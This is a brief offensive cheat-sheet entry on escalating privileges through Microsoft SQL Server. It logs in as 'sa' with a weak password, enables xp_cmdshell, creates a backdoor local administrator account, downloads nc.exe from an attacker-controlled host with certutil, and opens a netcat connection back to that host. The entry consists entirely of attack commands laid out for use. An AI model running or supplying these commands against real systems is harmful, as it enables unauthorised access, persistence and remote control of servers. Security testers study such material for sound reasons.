### SQL Services  privilege escalation
|for Example  |
| ------------- |
|python mssqlclient.py sa:123456@192.168.100.120|
|> EXEC sp_configure 'show advanced options', 1;|
|> EXEC sp_configure reconfigure;|
|> EXEC sp_configure 'xp_cmdshell', 1;|
|> EXEC sp_configure reconfigure;|
|> EXEC master.dbo.xp_cmdshell 'whoami';|
|> EXEC master.dbo.xp_cmdshell 'net localgroup administrators';|
|> EXEC master.dbo.xp_cmdshell 'net user NyaMeeEain 123456@aA /adds';|
|> EXEC master.dbo.xp_cmdshell 'net localgroup administrators /add NyaMeeEain';|
|> EXEC master.dbo.xp_cmdshell 'certutil.exe -urlcache -split -f  http://192.168.100.104:9090/nc.exe  c:\\windows\\Users\\Public\\nc.exe';|
|EXEC master.dbo.xp_cmdshell 'nc.exe  -nv 192.168.100.104 4444';
|
